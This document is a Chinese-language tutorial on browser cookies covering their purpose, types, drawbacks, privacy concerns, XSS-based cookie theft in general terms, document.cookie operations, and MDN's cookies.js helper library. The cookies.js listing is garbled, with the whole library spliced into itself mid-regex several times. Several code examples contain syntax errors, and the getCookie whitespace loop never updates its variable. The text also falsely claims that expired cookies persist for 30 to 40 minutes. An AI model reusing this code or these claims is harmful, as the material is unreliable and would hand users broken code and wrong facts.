# 描述

Cookie又被称为"小饼干".

Cookie是存储在计算机上类型为"小型文本文件"的数据.

Cookie保存在名称值对中,即 `key=value` 这样为一对,请看以下例子:

`usename=Yomua`

# 作用

## 描述

Cookie的作用: 某些网站为了辨别用户身份而存储在用户本地终端(Client Side)上的数据,此数据一般经过加密保存.

Cookie也是为了解决: "如何记住用户信息"而被发明的.

## Cookie的作用为什么主要是保存数据这一点呢?

因为[HTTP协议](https://zh.wikipedia.org/wiki/HTTP)是无状态的,即[服务器](https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8)不知道用户上一次做了什么,也就是用户在浏览器中如何的使用或者提交数据等,服务器皆不知道,这严重阻碍了[交互式Web应用程序](https://zh.wikipedia.org/wiki/%E4%BA%A4%E4%BA%92%E5%BC%8FWeb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)的实现.

### 示例

#### 购买商品

**<u>购买商品若无Cookie:</u>**

- 在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。

  最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么.

  所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。

  服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。

**<u>购买商品若有Cookie</u>**

- 在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时(服务器呈现数据给用户)，还发送了一段Cookie，记录着那项商品的信息。

  当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。

  然后若用户继续选购新商品，服务器就在原来那段Cookie里追加新的商品信息。

  结帐时，服务器读取发送来的Cookie就行了。

##### 登陆网站

**<u>登录网站使用Cookie保存账户和密码</u>**

- 在登录一个网站时,网站往往会要求用户输入账户和密码,并且用户还可以选择:"下次自动登录"

  若用户勾选了,那么下次访问同一网站时,用户会发现不用输入密码和账户就已经登录此网站了.

  这是因为前一次登录勾选"下一次登录"时,服务器发送了包含登陆凭据(账户和密码的某种加密形式)的Cookie到用户的硬盘上(这是属于硬盘Cookie,持久Cookie).

  当第二次登陆时,只要用户没有手工清除和Cookie未到过期时间,浏览器就会自动向服务器发送Cookie,服务器在验证凭据.

  于是用户不必输入账户和密码就能登陆了.

# 分类

Cookie总是保存在客户端中(Client Side),

按在客户端中存储的位,Cookie又可以被分为: 内存Cookie 和硬盘Cookie

按Cookie的存在时间,Cookie被分为: 非持久Cookie(内存Cookie)和持久Cookie(硬盘Cookie).

## 内存Cookie

内存Cookie由浏览器维护,保存在内存中,浏览器关闭后就消失了,其存在时间是短暂的.

## 硬盘Cookie

硬盘Cookie保存在硬盘中,有一个过期时间,除非用户手工清理或到了过期时间,否则硬盘中的Cookie是不会被删除的,其存在时间是长期的.

# 浏览器使用Cookie

用户可以改变浏览器中的设置,禁止/开启使用Cookie功能.

同时一些浏览器自带或安装开发者工具包允许用户查看、修改或删除特定网站网站的Cookie信息.

# Cookie的缺陷

Cookie并不是完美无缺的,或者说任何一个东西都不是完美的,Cookie亦是如此.

1. Cookie会被附加在每个HTTP请求中,所以无形中增加了流量.
2. 由于在HTTP请求中,Cookie是明文传递的,所以存在安全性问题,除非用[HTTPS](https://zh.wikipedia.org/wiki/HTTPS)
3. 由于Cookie的类型就是"小型文本文件",且大小限制在4KB左右,所以对于复杂的存储需求来说是不够用的.



# 反对使用Cookie者的原因

由于Cookie的缺陷,所以从不乏有人会反对Cookie在网络中的应用,他们的理由如下:

## 识别不精确

如果在同一台机器上使用多个浏览器，每个浏览器在不同的存储位置保存 Cookie，因此，Cookie 并不能定位到一个具体的人(比如yomua)，而是用户,计算机和浏览器的组合。

## 不准确的状态

如果用户在获取了一个 Cookie 之后,点击了浏览器的"回退"按键,则浏览器的状态和获取Cookie 的状态就出现了不一致.

例如, 如果网站基于 Cookie 技术实现了购物车的应用,当用户添加了物品后点击了"回退"按键, 购物车的物品状态可能并没有发生变化.

## 隐私安全和广告

Cookies在某种程度上说已经严重危及用户的隐私和安全。

其中的一种方法是：一些公司的高层人员为了某种目的（譬如市场调研）而访问了从未去过的网站（通过搜索引擎查到的），

而这些网站包含了一种叫做[网页臭虫](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%A0%87)的图片，该图片透明，且只有一个像素大小（以便隐藏），它们的作用是将所有访问过此页面的计算机写入Cookie。

而后，电子商务网站将读取这些Cookie信息，并寻找写入这些Cookie的网站，随即发送包含了针对这个网站的相关产品广告的垃圾邮件给这些高级人员。

# 偷窃Cookie和脚本攻击



虽然Cookies没有中电脑病毒那么危险，但它仍包含了一些敏感消息：用户名、电脑名、使用的浏览器和曾经访问的网站。

用户不希望这些内容泄漏出去，尤其是当其中还包含有私人信息的时候。

这并非危言耸听，[跨网站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)（Cross site scripting）可以达到此目的。在受到跨网站脚本攻击时，Cookie盗贼和Cookie毒药将窃取内容。一旦Cookie落入攻击者手中，它将会重现其价值。

- Cookie盗贼：搜集用户Cookie并发给攻击者的黑客，攻击者将利用Cookie消息通过合法手段进入用户帐户。

- Cookie投毒：一般认为，Cookie在储存和传回服务器期间没有被修改过，而攻击者会在Cookie送回服务器之前对其进行修改，达到自己的目的。

  例如，在一个购物网站的Cookie中包含了顾客应付的款项，攻击者将该值改小，达到少付款的目的。

# Cookie的替代品

鉴于Cookie的局限性和反对者的声音,有如下一些替代方法:

- Brownie方案，是一项开放源代码工程，由SourceForge发起。Brownie曾被用以共享在不同域中的接入，而Cookies则被构想成单一域中的接入。**这项方案已经停止开发。**
- P3P，用以让用户获得更多控制个人隐私权利的协议。在浏览网站时，它类似于Cookie。
- 在与服务器传输数据时，通过在地址后面添加唯一查询串，让服务器识别是否合法用户，也可以避免使用Cookie。

虽然Cookie的替代品有是有,但是截至2020/2/8,浏览器大多数都在使用Cookie存储一些较小的数据.

# -------------

# DOM和Cookie

- 需要注意的是: chrome中可能无法这么简单的使用cookie

通过DOM的接口,我们可以使用JavaScript对Cookie进行创建,删除,读取,修改等操作.

只需要使用Document接口的cookie属性,再使用它的具体实现,即实现Document接口的document对象的cookie属性.

## document.cookie

### 描述

获取并设置当前(指定)文档相关联的cookie.

**注意:若使用此格式,一次只能对一个cookie进行设置或更新,不能一次设置多个cookie.**

### 语法

#### 创建cookie

使用DOM的接口再通过JS调用接口创建cookie

##### 格式

document.cookie = newCookie;

##### 可选的cookie参数

以下是可选的cookie属性值(参数)可以跟在键值对后，用来具体化对cookie的设定/更新，使用分号以作分隔：

- `;path=`*`path`* (例如 '/', '/mydir') 如果没有定义，默认为当前文档位置的路径。

- `;domain=`*`domain`* (例如 'example.com'， 'subdomain.example.com') 如果没有定义，默认为当前文档位置的路径的域名部分。

  与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的cookie。

  如果指定了一个域，那么子域也包含在内。

- `;max-age=`*`max-age-in-seconds`*(例如一年为60 * 60 * 24 * 365)

  设置内容能被缓存的时间.

- `;expires=`*`date-in-GMTString-format`*

   设置该cookie的到期时间,如果没有定义，cookie会在对话结束时过期(即如同删除)

  - 这个值的格式参见[Date.toUTCString()](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Date/toUTCString) 

- `;secure` (cookie只通过https协议传输,没有这个参数,则代表能在允许cookie的协议中使用cookie)

以上的参数是添加在 `key=value`这样的一对后面的参数,目的和作用上面都已经说明.

##### 描述

在使用以上格式创建一个新的cookie时,一次只能创建一个 `key=value` 或者再加其余参数,多创建值对,则只有第一对有用,后面除参数外全无效.

```js
document.cookie = "oo=oo;bb=bb"
alert(document.cookie); // oo=oo
```

且重复创建相同的值对则也无效（与其说是无效,不如key是唯一的,请看最后面的示例)

```js
document.cookie = "username=yomua";
document.cookie = "username=yomua";
alert(document.cookie); // username=yomua
```

且无论在引号""的等号=两边中是否添加空格并不影响显示cookie的格式,即永远key和value紧挨着等号=出现 

```js
document.cookie = "username = yomua";
alert(document.cookie); // username=yomua
```

使用document.cookie多次创建新的cookie时,它是以一种类似字符串拼接的形式将新创建的cookie添加到字符串后面,每个cookie值以分号;分隔.

```js
    document.cookie = "username=yomua"
    document.cookie = "fuck=fuck"
    document.cookie = "yok=123133"
    alert(document.cookie); 
// username=yomua;fuck=fuck;yok=123133
```

若在key或value的中间添加1个/多个(测试过,可以添加任意个空格)空格,则也会被输出.

```js
document.cookie = "user name=yo   mu  a";
alert(document.cookie); // user name=yo   mu  a
```

我们可以直接从代码中对cookie值中的进行更改操作,~~但是这并没有意义~~,~~因为~~当网页刷新,网页会创建新的cookie.(因为key被改变了)

当然若只更改key=value中的value,则会导致未更改的key=value会被更改的key=value所覆盖,而更改过后的key=value将会按照规则添加到最后面.

```js
document.cookie = "username=yomua";
alert(document.cookie); // username=yomua,第一次会输出
// 若将上面第一行代码改成以下形式
document.cookie = "username=YYYYomua";
alert(document.cookie); // username=YYYYomua,第二次则会输出
```

即key是唯一的,重复的key和不同的value,后者将覆盖前者,并重新入栈.

##### 示例

创建自己的cookie

```js
document.cookie = 'username=Yomua';
```

使用exprires属性为cookie添加一个有效日期,通常情况下cookie存于内存,所以浏览器关闭则删除cookie

```js
document.cookie = "username=John Doe" +;
"expires=Sun, 31 Dec 2017 12:00:00 UTC";
```

通过path参数,我们可以让浏览器知道cookie属于什么路径,默认情况下,cookie属于当前页.

```js
document.cookie = "username=Bill Gates" +;
"expires=Sun, 31 Dec 2017 12:00:00 UTC" +;
"path=/";
```



#### 读取cookie

使用DOM的接口再通过JS调用接口读取cookie

##### 格式

`let allCookie = document.cookie;`

#####  描述

我们已经知道document.cookie是获取并设置当前文档相关联的cookie,且是以字符串的形式将之赋值给一个变量.

在上面的格式中,allCookie被赋值一个字符串,但是这个字符串并不是正常的文本字符串,因为该字符串包含所有的cookie,每条cookie以;(分号)和 (空格)隔开,就像类似字符串的拼接那样.

即 key1=value1;key2=value2;....

#### 修改cookie

使用DOM的接口再通过JS调用接口改变cookie

在 创建cookie-描述 中的例子中,作者就有说到过

##### 格式

`document.cookie = "username=Steve Jobs; expires=Sun, 31 Dec 2017 12:00:00 UTC; path=/";`

##### 描述

我们可以直接从代码中对cookie值中的进行更改操作,当网页刷新,网页会创建新的cookie.

当然若只更改key=value中的value,则会导致未更改的key=value会被更改的key=value所覆盖,而更改过后的key=value将会按照规则添加到最后面.

```js
document.cookie = "username=yomua";
alert(document.cookie); // username=yomua,第一次会输出
// 若将上面第一行代码改成以下形式
document.cookie = "username=YYYYomua";
alert(document.cookie); // username=YYYYomua,第二次则会输出

/*
	且第二次输出是不会创建新的cookie,而是将原有的cookie进行覆盖,并将新的cookie添加到整个cookie字符串的末尾.
*/
```

#### 删除cookie

使用DOM的接口再通过JS调用接口删除cookie

##### 格式

document.cookie = 'username=yomua;expires=[一个过去的日期即可]'

##### 描述

删除cookie是一个非常简单的事情,而且删除cookie时不需要指出cookie的值,即value,只需要将expires属性(参数)设置为过去的日期即可.

​	注意,如果只过期一点时间,例如几分钟,十几分钟,那么cookie还是会暂时存在. 只有过期一段时间,比如30,40分钟以上等,cookie才会完全过期,才会消失.

或者将max-age(内容能够被缓存的时间)设置为0S即可,其效果与expires参数一样.

##### 示例

```js

	document.cookie = "username=yomua; expires=Thu, 01 Jan 1970 00:00:00 UTC; ";
    alert(document.cookie);//一个空的字符串
```

```js
document.cookie = "username=yomua; max-age=0";
alert(document.cookie);//一个空的字符串
```

以上两个都可以达到删除cookie的目的, 在Fiefox中,我们只需要查看 存储-cookie中的我们设置的cookie数据,然后在改变代码中的参数,刷新cookie当前所在的网页,就会发现存储的cookie消失了.

然后重复以上步骤,试验这两段代码,即可发现是一样的效果.

至于将max-age改为其他值,试过,但是错了一些问题,因为我并不知道其格式是如何,比如将 max-age=1,我无法直到这个1代表什么,是1S?1天还是1年等.

# cookie的实例

## 简单的实例

### 	得到指定的key的value

```js
document.cookie = 'username=Yomua';
document.cookie = 'love=yhw';
let myCookie = document.cookie.replace(/(?:(?:^|.*;\s*)love\s*\=\s*([^;]*).*$)|^.*$/, "$1");
alert(myCookie); // yhw
```

**代码解析**

- `let myCookie = document.cookie.replace(/(?:(?:^|.*;\s*)love\s*\=\s*([^;]*).*$)|^.*$/, "$1");`

  ​    获取当前文档的cookie字符串,再使用replace()方法,设置两个参数:

  > ​	其replace()语法为:
  >
  > ​	`str.replace(regexp|substr, newSubStr|function)`
  >
  > ​		**regexp**:	一个[`RegExp`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp) 对象或者其字面量。该正则所匹配的内容会被第二个参数的返回值替换掉。
  >
  > ​		**substr**:	一个将被 `newSubStr` 替换的 [`字符串`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/String)。其被视为一整个字符串，而不是一个正则表达式。仅第一个匹配项会被替换。
  >
  > ​		**newSubStr**:	用于替换掉第一个参数在原字符串中的匹配部分的[`字符串`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/String)。该字符串中可以内插一些特殊的变量名。
  >
  >  							*参考下面的使用字符串作为参数。*
  >
  > ​		**function**:	一个用来创建新子字符串的函数，该函数的返回值将替换掉第一个参数匹配到的结果。
  >
  > ​							*参考下面的指定一个函数作为参数*。

  ​    这里我们设置的两个参数分别为: RegExp字面量和newSubStr,即一个正则表达式和一个字符串参数.

  ​    通过正则表达式的解析,可知,此正则表达式意思为: 匹配所有字符(除回车外等).

  ​    然后使用replace()方法的第二个参数: 一个特殊的字符串"$1",并使用它的返回值将第一个参数所匹配到的内容替换.

  ​	最后得出的内容赋值给myCookie,即完成.

  

  ​    以下为第二个参数中的字符串可以选择插入一些特殊的变量名,供我们选择:

  | 变量名 | 代表的值                                                     |
  | ------ | ------------------------------------------------------------ |
  | `$$`   | 插入一个 "$"。                                               |
  | `$&`   | 插入匹配的子串。                                             |
  | `$`    | 插入当前匹配的子串左边的内容。                               |
  | `$'`   | 插入当前匹配的子串右边的内容。                               |
  | `$n`   | 假如第一个参数是 [`RegExp`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp)对象，并且 n 是个小于100的非负整数，那么插入第 n 个括号匹配的字符串。提示：索引是从1开始 |

  ​    显然,根据replace()方法的第二个参数"$1",再对照以上表格,我们可知,"$1"的返回值为: 第一个参数(正则表达式)的子表达式.

  ​    所以整个document.cookie.replace(regex,"$1)的意思为:

  ​		获取当前文档的cookie,使用replace()方法,将其中的第一个参数(正则表达式)所匹配到的字符串,

  ​    	再用该参数中的第一个子表达式(即第一个括号对中,它是非捕获分组)所匹配到字符串替换掉整个正则表达式的内容.

  ​		最后得出的返回值,即得出的字符串赋值给myCookie.

## 完整较复杂的示例

**该示例为: 记住用户的名字,即value.**

### 步骤解析

- 当网页加载时就开始判断
  - 浏览器未关闭前[有存在cookie]
  - 浏览器未关闭前[不存在cookie]
- 有存在cookie
  - 获取cookie,并将之输出
- 不存在cookie
  - 设置cookie

### 代码

```html
<html>
<body onload = "judgeCookie()"></body>
<script>
    
    /* 判断cookie是否存在 */
    function judgeCookie() {
        let userValue = getCookie('username');
        if (userValue != '' && userValue != null) {
            alert('再次欢迎您的到来: ' + userValue);
        } else {
            let user = prompt('请输入您的姓名:', '')
            if (user != '' && user != null) {
                // 3个参数分别为:key,value,expires的关键字
                setCookie('username', user, 30);
            }
        }
    }

    /* 设置当前文档的cookie */
    function setCookie(key, value, exdays) {
        let date = new Date();
        // 从1970年1月1日0时0分0秒到现在这1S的总共毫秒数,并加上踢月的天数*24小时*60分钟*60秒*1000(*1000的目的将ms转为s)
        date.setTime(date.getTime() + (exdays * 24 * 60 * 60 * 1000));
        // 结果为: expires=''使用UTC时区,将一个日期转为字符串.
        expires = 'expires=' + date.toUTCString();
        document.cookie = key + '=' + value + ';' + expires;
    }

    /* 获取当前文档的cookie的value值 */
    function getCookie(cKey) {
        let key = cKey + '=';
        // cookie进行解码成原字符,即一个字符串
        let decodeCookie = decodeURIComponent(document.cookie);
        // 将cookie字符串转为字符串数组,其结果格式:['key=value',expires='xx','...',...];
        let preserve = decodeCookie.split(';');
        // 提取cookie字符串数组中的key=value
        for (let i = 0; i < preserve.length; i++) {
            // tempStr: 'key=value', 'expires="cookie过期的时间."'
            let tempStr = preserve[i];
            /* 
            	另附:这是担心key=value前面有空格的子程序
            	charAt(0):得到字符串的第0个索引的字符
            */
            while (tempStr.charAt(0) == ' ') {
                // 将空格去除
                tempStr.substring(1);
            }
            // key(username=)若在tempStr中出现的索引为0
            if (tempStr.indexOf(key) == 0) {
                // 截取tempStr: [9,整个key=value的长度];长度				从1计算,但截取时索引为0,即长度=9,则截取时:0-9(有10			 个)
                return tempStr.substring(key.length, 				tempStr.length)
            }
        }
        console.log("key:" + key.length)
        /* 
        	若以上的return没有触发,则代表没有cookie或格式错误等		错误.即返回空值
        */
        return ''
    }
</script>
</html>
```

在以上的示例中,可直接复制到一个编译器中即可运行,通常来说不会错误.

且在示例中的注释,有了大致的解释,不至于会看不懂,在这里说一些可以去了解了方法.

- substring():,split();

  详情请看: <各类属性&方法.md>

- charAt([index]);

  从一个字符串中返回指定的字符

  - index:可选.

    一个介于0 和字符串长度减1之间的整数。 (0~length-1)

    如果没有提供索引，charAt() 将使用0。

    字符串中的字符从左向右索引，第一个字符的索引值为 0，最后一个字符（假设该字符位于字符串 stringName 中）的索引值为 `stringName.length - 1`。 

    如果指定的 index 值超出了该范围，则返回一个空字符串。

- decodeURIComponent(encodedURI);

  用于解码由 encodeURIComponent 方法或者其它类似方法编码的部分统一资源标识符（URI）。

  - encodedURI必选

    编码后的部分 URI

    其返回值为: 一个解码后的统一资源标识符（URI）字符串，处理前的URI经过了给定格式的编码。

# 小框架

一个小框架,一个完整支持unicode的cookie读取/写入器

## 描述

作为一个格式化过的字符串，cookie的值有时很难被自然地处理。

下面的库的目的是通过定义一个和`Storage对象`部分`一致的`对象（docCookies），简化`document.cookie` 的获取方法。

它提供完全的Unicode支持。

## 库

```js
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function (sKey) {
    return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function (sKey) {
    return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) { return false; }
    document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + ( sDomain ? "; domain=" + sDomain : "") + ( sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
  },
  keys: /* optional method: you can safely remove it! */ function () {
    var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
    return aKeys;
  }
};
amp;") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) { return false; }
    document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + ( sDomain ? "; domain=" + sDomain : "") + ( sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function (sKey) {
    return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) { return false; }
    document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + ( sDomain ? "; domain=" + sDomain : "") + ( sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
  },
  keys: /* optional method: you can safely remove it! */ function () {
    var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
    return aKeys;
  }
};
amp;") + "\\s*\\=")).test(document.cookie);
  },
  keys: /* optional method: you can safely remove it! */ function () {
    var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
    return aKeys;
  }
};
```

### Note

对于永久cookie我们用了`Fri, 31 Dec 9999 23:59:59 GMT`作为过期日。

如果你不想使用这个日期，可使用*[世界末日](http://en.wikipedia.org/wiki/Year_2038_problem)*`Tue, 19 Jan 2038 03:14:07 GMT，`它是32位带符号整数能表示从1 January 1970 00:00:00 UTC开始的最大秒长

即`01111111111111111111111111111111`, 是 `new Date(0x7fffffff * 1e3)`.

### 写入cookie

#### 语法

`docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])`

#### 描述

创建或覆盖一个cookie

#### 参数

- `name` (必要)

  要创建或覆盖的cookie的名字 ([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String))。

- `value` (必要)

  cookie的值 ([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String))。

- `end` *(可选)*

  [`最大年龄`](javascript:void(0))的秒数 (一年为31536e3， 永不过期的cookie为[`Infinity`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Infinity)) ，或者过期时间的[`GMTString`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Date/toGMTString)格式或`Date对象`; 如果没有定义则会在会话结束时过期 ([`number`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Number) – 有限的或 [`Infinity`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Infinity) – [`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String), [`Date` object](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Date) or [`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。

- `path` *(可选)*

  例如 '/', '/mydir'。 如果没有定义，默认为当前文档位置的路径。([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String) or [`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。路径必须为绝对路径（参见 [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](javascript:void(0))。

- `domain` *(可选)*

  例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string或`[`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。

- `secure` *(可选)*

  cookie只会被https传输 ([`boolean`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Boolean)或[`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。

### 读取cookie

#### 语法

`docCookies.getItem(name)`

#### 描述

读取一个cookie。如果cookie不存在返回null。

#### 参数

- `name`

  读取的cookie名 ([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).

### 移除cookie

#### Syntax

`docCookies.removeItem(name[, path],domain)`

#### 描述

删除一个cookie。

#### 参数

- `name`

  要移除的cookie名([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).

- `path` *(*可选*)*

  例如 '/', '/mydir'。 如果没有定义，默认为当前文档位置的路径。([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String) or [`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。路径必须为绝对路径（参见 [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](javascript:void(0))。

- `domain `(可选)

  例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string或`[`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。

### 检测cookie

#### 语法

`docCookies.hasItem(name)`

#### 描述

检查一个cookie是否存在

##### 参数

- `name`

  要检查的cookie名 ([`string`](https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).

### 得到所有cookie的列表

#### 语法

`docCookies.keys()`

#### 描述

返回一个这个路径所有可读的cookie的数组。

### 示例

```js
    docCookies.setItem("test0", "Hello world!");

